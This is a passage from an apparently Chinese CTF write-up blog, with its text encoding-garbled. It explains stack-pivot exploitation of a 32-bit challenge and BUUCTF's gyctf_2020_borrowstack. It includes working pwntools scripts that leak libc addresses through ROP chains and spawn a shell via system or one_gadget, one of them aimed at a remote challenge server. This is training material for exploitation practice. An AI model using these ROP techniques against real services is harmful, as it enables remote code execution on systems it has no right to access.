class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048513</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>) <span class="comment">#å‰é¢çš„æ˜¯bssæ®µåœ°å€ï¼Œåé¢è¿™ä¸ªåœ°å€æ˜¯level;retåœ°å€</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„ç‚¹ï¼Œä¸€å®šè¦æ³¨æ„ï¼Œå°±æ˜¯è¿™é‡Œç¬¬äºŒæ¬¡è¾“å…¥çš„æ—¶å€™ï¼Œå¿…é¡»è¦ç”¨sendå»å‘é€ï¼Œä¸èƒ½ç”¨sendlineå‘é€</p><p>ä¸‹å›¾çš„å·¦ä¾§æ˜¯ä½¿ç”¨sendå‘é€äº†0x20ä¸ªæ•°æ®ï¼Œå³ä¾§ä½¿ç”¨çš„æ˜¯sendlineå‘é€äº†0x20ä¸ªæ•°æ®ï¼Œå¯ä»¥å‘ç°ï¼Œ<em>å³ä¾§æœ€åå‘é€æ˜¯å¤šäº†ä¸€ä¸ªå›è½¦</em>ï¼Œæ­¤æ—¶ç¨‹åºæœ¬æ¥æ˜¯æ­£å¸¸è¦å‘é€ä¸€å¥hello good ctfer!what is you name?ç„¶åä¼šç­‰å¾…ç”¨æˆ·å‘é€ä¸€ä¸ªå†…å®¹ï¼Œç„¶åæ˜¾ç¤ºwhat you want toï¼Œå·¦ä¾§çš„ç¡®æ˜¯è¿™æ ·ï¼Œä½†å³ä¾§ç›´æ¥what is you name?ä¹‹åæŠŠwhat you want toç»™æ‰“å°å‡ºæ¥äº†ï¼Œä¹Ÿå°±æ ¹æœ¬æ²¡æœ‰è®©ç”¨æˆ·è¾“å…¥å†…å®¹ï¼Œä¸ºä»€ä¹ˆï¼Ÿ<strong>å› ä¸ºsendlineå¤šå‡ºæ¥çš„å›è½¦ï¼Œå­˜æ”¾åˆ°äº†ç¼“å†²åŒºé‡Œé¢ï¼Œä¸‹æ¬¡è¾“å…¥çš„æ—¶å€™ï¼Œç¨‹åºç›´æ¥å°±æŠŠç¼“å†²åŒºé‡Œçš„å†…å®¹è¯»è¿›å»äº†ï¼Œå‘ç°æ˜¯ä¸ªå›è½¦ï¼Œç¨‹åºè®¤ä¸ºä½ çš„è¾“å…¥å·²ç»ç»“æŸäº†ï¼Œå› æ­¤å°±æ‰“å°äº†what you want toï¼Œäº‹å®ä¸Šä½ æ ¹æœ¬å°±è¿˜æ²¡è¾“å…¥ã€‚</strong></p><p>ç”±æ­¤å¯è§ï¼Œåœ¨ä»»ä½•æ—¶å€™å‘é€æ•°æ®ï¼Œé€‰æ‹©sendlineæ—¶ï¼Œéƒ½éœ€è°¨æ…ã€‚<br><img src="../img/2706180-20220118123108958-93341427.jpg" alt="EkPq.jpg" border="0"></p><h2 id="BUUCTFä¸Šçš„gyctf-2020-borrowstack"><a href="#BUUCTFä¸Šçš„gyctf-2020-borrowstack" class="headerlink" title="BUUCTFä¸Šçš„gyctf_2020_borrowstack"></a>BUUCTFä¸Šçš„gyctf_2020_borrowstack</h2><p>è¿™é“é¢˜ï¼Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œç”¨è¿œç¨‹çš„expæ˜¯æ‰“ä¸é€šæœ¬åœ°çš„ã€‚å› æ­¤è¿™é‡Œæˆ‘è¿œç¨‹å’Œæœ¬åœ°çš„wpåˆ†åˆ«å†™äº†ä¸€ä»½ã€‚äºŒè€…çš„å‰é¢æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼ˆä½†æ˜¯åé¢çš„æ€è·¯æ˜¯ä¸ä¸€æ ·çš„ï¼‰ï¼Œå¦‚æœçœ‹è¿‡å…¶ä¸­ä¸€ä»½ï¼Œé‚£ä¹ˆå¦ä¸€ä»½å‰é¢çš„å†…å®¹è·³è¿‡å³å¯ã€‚<br>###æ‰“è¿œç¨‹çš„WP</p><p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œä¹Ÿå‘ç°äº†æº¢å‡ºç‚¹åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸Šï¼Œreadè¯»å…¥bufçš„æ—¶å€™ï¼Œå¯ä»¥æº¢å‡º16ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æº¢å‡ºä¸¤ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ã€‚</p><p><img src="/../img/2706180-20220206163137949-2023688181.png"></p><p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ä»…ä»…èƒ½æ§åˆ¶rbpå’Œè¿”å›åœ°å€ã€‚å¹¶ä¸”ç¬¬äºŒæ¬¡è¾“å…¥çš„bankï¼Œè¾“å…¥åˆ°äº†bssæ®µ</p><p><img src="/../img/2706180-20220206163202729-1115577905.png"></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘æ ˆè¿ç§»ï¼ŒæŠŠéœ€è¦æ„é€ çš„payloadè½¬ç§»åˆ°bssæ®µã€‚åŒæ—¶ä¹Ÿæ²¡æœ‰å‘ç°åé—¨å‡½æ•°å’Œ&#x2F;bin&#x2F;shå‚æ•°ã€‚</p><p>æˆ‘ä»¬å…ˆè¯´ä¸€ä¸‹æ­£å¸¸çš„æ€è·¯ã€‚ä¹‹å‰è®²è¿‡äº†æ ˆè¿ç§»çš„åŸç†ï¼Œå› æ­¤æˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„readè‚¯å®šæ˜¯å‰é¢å¡«å……åƒåœ¾æ•°æ®ï¼Œç„¶åæŠŠrbpå¡«å……æˆæˆ‘ä»¬è¦è¿ç§»çš„åœ°å€ï¼Œç„¶åè¿”å›åœ°å€å†™ä¸€ä¸ªlevel;retæŒ‡ä»¤çš„åœ°å€ã€‚ç„¶åç¬¬äºŒæ¬¡è¾“å…¥åˆ°bssæ®µå»æ„é€ æˆ‘ä»¬çš„payloadã€‚å› ä¸ºæˆ‘ä»¬æ²¡æœ‰åé—¨å‡½æ•°ï¼Œé‚£åªèƒ½å»æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œç„¶åå»åŠ¨æ€åº“é‡Œé¢æ‰¾åé—¨å‡½æ•°ï¼Œæ¥ç€æŠŠè¿”å›åœ°å€å¡«å†™æˆmainå‡½æ•°çš„åœ°å€ï¼Œç„¶åå†æ¥ä¸€æ¬¡æ ˆè¿ç§»ï¼Œå»æ„é€ è·å–shellçš„payloadã€‚</p><p>ä½†æ˜¯è¿™é“é¢˜æœ‰å¥½å‡ ä¸ªåœ°æ–¹éœ€è¦å»æ³¨æ„ã€‚é¦–å…ˆæ˜¯æˆ‘ä»¬çœ‹ä¸€ä¸‹å†™å…¥bssæ®µåœ°å€ã€‚</p><p><img src="/../img/2706180-20220206163247051-126352913.png"></p><p><img src="/../img/2706180-20220206163309124-364277226.png"></p><p>å‘ç°äº†gotè¡¨ç¦»è¿™ä¸ªbssæ®µåœ°å€æ˜¯å¾ˆè¿‘çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠæ ˆè¿ç§»åˆ°bssæ®µï¼Œå°±æ˜¯å¯ä»¥æŠŠè¿™ä¸ªbssæ®µç»™çœ‹æˆæ ˆäº†ï¼Œæˆ‘ä»¬ä¼šåœ¨è¿™ä¸ªâ€œæ ˆâ€é‡Œé¢è°ƒç”¨putså‡½æ•°å»æ³„éœ²å‡½æ•°åœ°å€ï¼Œä½†æ˜¯è°ƒç”¨putsçš„æ—¶å€™ä¼šå¼€è¾Ÿæ–°çš„æ ˆå¸§ä»è€Œæ”¹å˜åœ°å€è¾ƒä½å¤„çš„å†…å®¹ï¼ˆä¸ä»…ä»…æ˜¯gotè¡¨ï¼Œè¿˜æœ‰FILE *stdoutå’ŒFILE *stdinï¼‰ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚è¿™é‡Œå…‰è¯´çš„è¯ï¼Œæ¯”è¾ƒæŠ½è±¡ï¼Œæˆ‘åœ¨è¿™é‡Œè¯¦ç»†è®²ä¸€ä¸‹ã€‚</p><p>å› ä¸ºè¿™é‡Œçš„åœ°å€0x601060å­˜æ”¾çš„æ˜¯stdoutæŒ‡é’ˆï¼Œç„¶åç­‰åˆ°è¿”å›mainå‡½æ•°ä¹‹ååˆä¼šæ‰§è¡Œsetbuf(stdout, 0LL);å¯æ˜¯å› ä¸ºè¿™ä¸ª0x601060è·ç¦»æˆ‘ä»¬è¿ç§»åˆ°çš„bssæ®µè¿™é‡Œå¤ªè¿‘äº†ï¼ˆæˆ‘ä»¬è¿ç§»åˆ°çš„åœ°å€æ˜¯0x601080ï¼‰ï¼Œå½“æ‰§è¡Œputå‡½æ•°çš„æ—¶å€™æ‰§è¡Œäº†ä¸€æ¬¡sub rsp 0x18,å¹¶ä¸”è¿˜æ‰§è¡Œäº†å¤šæ¬¡çš„pushï¼Œæ­¤æ—¶çš„0x601060å·²ç»è¢«è¦†ç›–æˆåˆ«çš„å†…å®¹äº†å…·ä½“æƒ…å†µå‚è€ƒä¸‹é¢çš„å›¾ã€1ã€‘å’Œå›¾ã€2ã€‘<br><img src="/../img/2706180-20220206163334765-1162997865.png"></p><p><img src="/../img/2706180-20220206163343356-1256253278.png"></p><p>â€‹               å›¾ã€1ã€‘</p><p><img src="/../img/2706180-20220206163355949-1171818220.png"></p><p>â€‹å›¾ã€2ã€‘</p><p>å¯ä»¥çœ‹è§è¿™ä¸¤å¼ å›¾ç‰‡ï¼Œéƒ½å› ä¸ºè°ƒç”¨äº†putså‡½æ•°ï¼Œä»è€Œå½±å“äº†æ ˆçš„å˜åŒ–ï¼Œä¿®æ”¹äº†stdoutæŒ‡é’ˆã€‚ç­‰åˆ°è¿”å›mainå‡½æ•°çš„æ—¶å€™ï¼Œæ‰§è¡Œäº†setbuf(stdout, 0LL)ï¼Œä»è€Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>å› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬çš„æ€è·¯æ˜¯åˆ©ç”¨retæŒ‡ä»¤ï¼ŒæŠŠæ„é€ çš„payloadçš„å­˜å…¥ç¨å¾®é«˜ç‚¹çš„åœ°å€ç©ºé—´ï¼Œè¿™æ ·å³ä½¿æ‰§è¡Œäº†putså‡½æ•°å¼€è¾Ÿäº†æ ˆå¸§ï¼Œä¹Ÿä¾æ—§æ²¡æœ‰å¹²æ‰°åˆ°0x601060æ‰€å­˜æ”¾çš„stdoutæŒ‡é’ˆã€‚</p><p>ç»§ç»­è¯´è¿™ä¸ªæ€è·¯é‡è§çš„é—®é¢˜ï¼Œå› ä¸ºè¦åˆ©ç”¨retæŒ‡ä»¤å¾€ä¸‹è¿ç§»æ¥è¿›è¡Œâ€œæ ˆâ€çš„å¸ƒå±€ï¼Œä½†æ˜¯ç”¨å¤šå°‘ä¸ªretå¾€ä¸‹æ»‘ï¼Œè¿™ä¸ªåªèƒ½å»ä¸€æ¬¡ä¸€æ¬¡è¯•ã€‚å‘ç°è‡³å°‘å¡«å……20ä¸ªretå°±å¯ä»¥æŠŠâ€æ ˆâ€è¿ç§»åˆ°ä¸€ä¸ªä¸ä¼šå½±å“ç¨‹åºè¿è¡Œçš„åœ°æ–¹ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦ç¬¬äºŒæ¬¡å…ˆè¾“å…¥20ä¸ªretï¼Œç„¶åæ­£å¸¸çš„å†™ä¸€ä¸ªpop_rdiçš„æŒ‡ä»¤ï¼Œç„¶åæ˜¯putsçš„gotåœ°å€ï¼Œæ¥ç€å°±å¡«å†™putsçš„pltåœ°å€ï¼Œæœ€åæŠŠè¿”å›åœ°å€å¡«å†™æˆmainå‡½æ•°ã€‚è¿™æ ·å°±æ³„éœ²å‡ºæ¥äº†libc_baseï¼Œç„¶åæ‰¾åˆ°libcç‰ˆæœ¬ï¼ˆæ‰“æœ¬åœ°å’Œè¿œç¨‹æ‰¾libcç‰ˆæœ¬æ˜¯æ–¹æ³•æ˜¯ä¸ä¸€æ ·çš„ï¼‰æˆ‘è¿™é‡Œè¯´ä¸‹è¿œç¨‹çš„libcç‰ˆæœ¬æ€ä¹ˆæ‰¾ï¼Œçœ‹ç½‘ä¸Šå¸ˆå‚…ä»¬è¯´æ˜¯æ³„éœ²å‡½æ•°åœ°å€çš„åä¸‰ä½ï¼Œç„¶åä¸Šç½‘ç«™ä¸Šæœç´¢libcç‰ˆæœ¬ï¼Œå¯æ˜¯æˆ‘è¯•äº†ä¸‹ä¸è¡Œï¼ˆä¸çŸ¥é“æ˜¯å“ªå‡ºäº†é—®é¢˜ï¼‰ï¼Œç„¶åæœ‰ä½å¸ˆå‚…å‘Šè¯‰æˆ‘ä»–æ˜¯è¿™ä¹ˆæ‰¾çš„ã€‚</p><p><img src="/../img/2706180-20220206163407809-1014058819.png"></p><p>å‘ç°è¿™æ˜¯ubuntu16ï¼Œç„¶åå»BUUCTFä¸Šæ‰¾èµ„æºï¼ˆå› ä¸ºæˆ‘è¿™ä¸ªæ˜¯åœ¨BUUCTFä¸Šåšçš„ï¼‰ï¼Œå‘ç°èµ„æºå¦‚ä¸‹</p><p><img src="/../img/2706180-20220206163434246-1049956071.png"></p><p>ç„¶åç‚¹ä¸€ä¸‹è¿™ä¸ª64bitçš„è¿™ä¸ªlibcï¼Œä¸‹è½½å³å¯ã€‚</p><p>æœ€åç”¨one_gadgetæ¥æœç´¢è¿™ä¸ªlibcçš„åº“ï¼Œå»æ‰¾åˆ°è·å–shellçš„è¯­å¥åœ°å€ã€‚</p><p><img src="/../img/2706180-20220206163445744-69836766.png"></p><p>è¿™ä¸ªconstraintsä¸‹é¢çš„å°±æ˜¯è¿™ä¸ªexecveæ‰§è¡Œçš„æ¡ä»¶(è‡³äºå“ªä¸ªåœ°å€èƒ½æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•è¯•å°±è¡Œï¼‰ï¼Œç„¶åä¸Šé¢å°±æ˜¯å¯¹åº”çš„åœ°å€ï¼Œæœ€åæˆ‘ä»¬è¦ç”¨è¿™ä¸ªåœ°å€å»åŠ ä¸Šlibc_baseï¼Œå¾—åˆ°çœŸæ­£çš„one_gadgetåœ°å€ã€‚æ¥ç€è¿”å›åˆ°mainå‡½æ•°å†æ¥ä¸€éï¼Œè¿™å›ç¬¬ä¸€æ¬¡è¾“å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªone_gadgetç»™æ”¾å…¥è¿”å›åœ°å€å³å¯ã€‚æœ€åè¦æ³¨æ„çš„å°±æ˜¯å› ä¸ºè¿”å›åˆ°mainå‡½æ•°ä¹‹åï¼Œæ˜¯æœ‰ä¸¤ä¸ªreadçš„ï¼Œå°½ç®¡æˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªreadå°±è¦†ç›–äº†è¿”å›åœ°å€ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æŠŠç¬¬äºŒä¸ªreadç»™å‘é€ä¸€ä¸ªå†…å®¹ï¼Œæ‰å¯ä»¥ç»“æŸmainå‡½æ•°ï¼Œå› æ­¤æˆ‘åœ¨æœ€åä¸€ä¸ªreadå‘é€äº†ä¸€ä¸ªâ€™1â€™ã€‚</p><p>è¿™ä¸ªæ€è·¯å…¶å®è¿˜æœ‰ä¸€ç§å˜å½¢ï¼Œå°±æ˜¯åœ¨ç¬¬ä¸€æ¬¡readçš„æ—¶å€™ï¼ŒæŠŠrbpç›´æ¥å¡«å……æˆæˆ‘ä»¬è¦è¿ç§»ä¹‹åçš„åœ°å€ï¼ˆè¿™ä¸ªåœ°å€æ˜¯è¦ä¿è¯æ‰§è¡Œputså‡½æ•°ä¹Ÿä¸ä¼šå¹²æ‰°åˆ°ç¨‹åºçš„æ­£å¸¸æ•°æ®ï¼‰ï¼Œç„¶åç¬¬äºŒæ¬¡è¾“å…¥åªéœ€è¦æŠŠè¿ç§»åçš„åœ°å€ä¹‹å‰å…¨éƒ¨å¡«å……æˆåƒåœ¾æ•°æ®ï¼Œç„¶åæ„é€ payloadï¼Œç­‰åˆ°è¿ç§»ä¹‹åï¼Œç›´æ¥è¿ç§»åˆ°äº†æ„é€ çš„payloadçš„è¿™é‡Œï¼Œæ•ˆæœå’Œå˜å½¢ä¹‹å‰çš„æ€è·¯æ˜¯ä¸€æ ·çš„ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25199</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_ret_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_addr=<span class="number">0x4004c9</span></span><br><span class="line">main_addr=<span class="number">0x400626</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr)+p64(level_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">payload2=p64(ret_addr)*<span class="number">20</span> <span class="comment">#è¿™é‡Œretæœ€å°‘æ˜¯20ä¸ªï¼Œä¹Ÿå¯ä»¥å¤šä¸€ç‚¹</span></span><br><span class="line">payload2+=p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(main_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell=libc_base+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shell))</span><br><span class="line">payload3=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xdeadbeef</span>)+p64(shell)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;u want\n&#x27;</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Done!You can check and use your borrow stack now!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>###æ‰“æœ¬åœ°çš„wp</p><p><img src="/../img/2706180-20220206163044818-1824898636.png"><br><img src="/../img/2706180-20220206163110657-718675687.png"></p><p>ä¸»ç¨‹åºå¾ˆç®€å•ï¼Œä¹Ÿå‘ç°äº†æº¢å‡ºç‚¹åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥ä¸Šï¼Œreadè¯»å…¥bufçš„æ—¶å€™ï¼Œå¯ä»¥æº¢å‡º16ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æº¢å‡ºä¸¤ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹ã€‚</p><p><img src="/../img/2706180-20220206163137949-2023688181.png"></p><p>å¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬ä»…ä»…èƒ½æ§åˆ¶rbpå’Œè¿”å›åœ°å€ã€‚å¹¶ä¸”ç¬¬äºŒæ¬¡è¾“å…¥çš„bankï¼Œè¾“å…¥åˆ°äº†bssæ®µ</p><p><img src="/../img/2706180-20220206163202729-1115577905.png"></p><p>é‚£æˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘æ ˆè¿ç§»ï¼ŒæŠŠéœ€è¦æ„é€ çš„payloadè½¬ç§»åˆ°bssæ®µã€‚åŒæ—¶ä¹Ÿæ²¡æœ‰å‘ç°åé—¨å‡½æ•°å’Œ&#x2F;bin&#x2F;shå‚æ•°ã€‚</p><p>æˆ‘ä»¬å…ˆè¯´ä¸€ä¸‹æ­£å¸¸çš„æ€è·¯ã€‚ä¹‹å‰è®²è¿‡äº†æ ˆè¿ç§»çš„åŸç†ï¼Œå› æ­¤æˆ‘ä»¬ç¬¬ä¸€æ¬¡çš„readè‚¯å®šæ˜¯å‰é¢å¡«å……åƒåœ¾æ•°æ®ï¼Œç„¶åæŠŠrbpå¡«å……æˆæˆ‘ä»¬è¦è¿ç§»çš„åœ°å€ï¼Œç„¶åè¿”å›åœ°å€å†™ä¸€ä¸ªlevel;retæŒ‡ä»¤çš„åœ°å€ã€‚ç„¶åç¬¬äºŒæ¬¡è¾“å…¥åˆ°bssæ®µå»æ„é€ æˆ‘ä»¬çš„payloadã€‚<strong>å› ä¸ºæˆ‘ä»¬æ²¡æœ‰åé—¨å‡½æ•°ï¼Œé‚£åªèƒ½å»æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œç„¶åå»åŠ¨æ€åº“é‡Œé¢æ‰¾åé—¨å‡½æ•°ï¼Œæ¥ç€æŠŠè¿”å›åœ°å€å¡«å†™æˆmainå‡½æ•°çš„åœ°å€ï¼Œç„¶åå†æ¥ä¸€æ¬¡æ ˆè¿ç§»ï¼Œå»æ„é€ è·å–shellçš„payloadã€‚</strong></p><p>ä½†æ˜¯è¿™é“é¢˜æœ‰å¥½å‡ ä¸ªåœ°æ–¹éœ€è¦å»æ³¨æ„ã€‚é¦–å…ˆæ˜¯æˆ‘ä»¬çœ‹ä¸€ä¸‹å†™å…¥bssæ®µåœ°å€ã€‚</p><p><img src="/../img/2706180-20220206163247051-126352913.png"></p><p><img src="/../img/2706180-20220206163309124-364277226.png"></p><p>å‘ç°äº†gotè¡¨ç¦»è¿™ä¸ªbssæ®µåœ°å€æ˜¯å¾ˆè¿‘çš„ï¼Œå› ä¸ºæˆ‘ä»¬è¦æŠŠæ ˆè¿ç§»åˆ°bssæ®µï¼Œå°±æ˜¯å¯ä»¥æŠŠè¿™ä¸ªbssæ®µç»™çœ‹æˆæ ˆäº†ï¼Œæˆ‘ä»¬ä¼šåœ¨è¿™ä¸ªâ€œæ ˆâ€é‡Œé¢è°ƒç”¨putså‡½æ•°å»æ³„éœ²å‡½æ•°åœ°å€ï¼Œä½†æ˜¯è°ƒç”¨putsçš„æ—¶å€™ä¼šå¼€è¾Ÿæ–°çš„æ ˆå¸§ä»è€Œæ”¹å˜åœ°å€è¾ƒä½å¤„çš„å†…å®¹ï¼Œå¯¼è‡´ç¨‹åºå´©æºƒã€‚</p><p>å› æ­¤åœ¨è¿™é‡Œæˆ‘ä»¬ä¸å»è¿”å›åˆ°mainå‡½æ•°ï¼Œç›´æ¥è¿”å›åˆ°readå‡½æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šæ‰§è¡Œsetbufã€‚</p><p>é¦–å…ˆçš„ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯æ ˆè¿ç§»ä¹‹åï¼Œå»æ‰§è¡Œputså‡½æ•°ï¼Œputså‡½æ•°å¼€è¾Ÿçš„æ ˆå¸§ä¼šå»å½±å“å‰é¢çš„gotè¡¨ä¸­çš„å†…å®¹ï¼Œå› æ­¤ä¿®æ”¹rbpæ—¶ï¼Œæˆ‘ä»¬æŠŠè¿ç§»çš„åœ°å€å†™çš„é«˜ä¸€ç‚¹ï¼Œè¿™æ ·è·³è½¬æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¸ä¼šå¹²æ‰°ä½åœ°å€çš„æ•°æ®ã€‚</p><p>ç”±äºè¿™æ˜¯64ä½ç¨‹åºï¼Œæˆ‘ä»¬è¦æƒ³æ‰§è¡Œreadï¼Œéœ€è¦å»æ‰¾gadgetè¿›è¡Œä¼ å‚ã€‚å¯æ˜¯æœç´¢ä¹‹åæ‰å‘ç°æˆ‘ä»¬æ²¡æœ‰èƒ½æ§åˆ¶rdxå’Œrsiçš„æŒ‡ä»¤ï¼Œè¿™ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¦‚æœæƒ³æ‰¾gadgetçš„è¯ï¼Œæ‰§è¡Œreadå‡½æ•°ï¼Œè¿è¾“å…¥çš„åœ°å€éƒ½æ§åˆ¶ä¸äº†ï¼Œå› æ­¤è¿™é‡Œé‡‡ç”¨ret2csuã€‚</p><p><img src="/../img/2706180-20220206164556714-917859079.png"></p><p> ï¼ˆå…³äºè¿™ä¸ªret2csuçš„ç»†èŠ‚ï¼Œåœ¨å¦ä¸€ç¯‡åšå®¢ä¸Šè¯´æ˜ï¼Œè¿™é‡Œåªä»‹ç»å¤§è‡´æ€è·¯ï¼‰ï¼Œç„¶åæ‰§è¡Œäº†readå‡½æ•°ä¹‹åï¼Œç›´æ¥æŠŠreadè¿”å›åœ°å€å¡«å†™one_gadgetåœ°å€å³å¯è·å–shellã€‚åœ¨æ‰§è¡Œreadä¹‹å‰å…ˆæ‰§è¡Œputså»æ³„éœ²putsçš„gotåœ°å€ï¼Œç„¶åæŠŠputsçš„è¿”å›åœ°å€è¿›è¡Œret2csuå»æ‰§è¡Œreadå‡½æ•°ã€‚æ‰§è¡Œå®Œputsçš„æ—¶å€™è¦è®°å¾—ç»™æ¥æ”¶äº†ï¼Œç„¶åæˆ‘ä»¬è¦å»æ‹¿åˆ°libcåŸºå€ï¼Œåªéœ€è¦ç”¨putsçš„çœŸå®åœ°å€å»å‡libcåº“ä¸­çš„putsåœ°å€å³å¯ã€‚ç”¨lddå»çœ‹ä¸‹ç¨‹åºæ‰€ä¾èµ–çš„åŠ¨æ€åº“ã€‚</p><p><img src="/../img/2706180-20220206164604873-25607843.png"></p><p>è·å–äº†åŠ¨æ€åº“çš„ç‰ˆæœ¬ä¹‹åï¼Œå°±å¯ä»¥å¾—åˆ°libcåŸºå€ï¼Œç„¶åå†ç”¨one_gadgetå»æœç´¢å¯ä»¥è·å–shellçš„one_gadgetã€‚</p><p> <img src="/../img/2706180-20220206164614769-1489437904.png"></p><p>è‡³äºå“ªä¸ªèƒ½ç”¨ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ä¸€ä¸‹å°±è¡Œäº†ã€‚æœ€åç”¨one_gadgetåŠ ä¸ŠlibcåŸºå€å°±æ˜¯èƒ½å¤Ÿè·å–shellçš„åœ°å€ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªæŒ‡ä»¤çš„åœ°å€æ”¾åˆ°readçš„è¿”å›åœ°å€å³å¯è·å–shellã€‚è‡³äºæ€ä¹ˆçŸ¥é“readçš„è¿”å›åœ°å€ï¼Œè¿™é‡Œæœ‰ç‚¹è®²ç©¶ã€‚</p><p>å› ä¸ºæˆ‘ä»¬è¿™é‡Œç›´æ¥call readçš„gotåœ°å€äº†ï¼Œå› æ­¤æ‰§è¡Œcallçš„æ—¶å€™ï¼Œä¼šæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤å»å½“åšè¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯0x4006ed<br><img 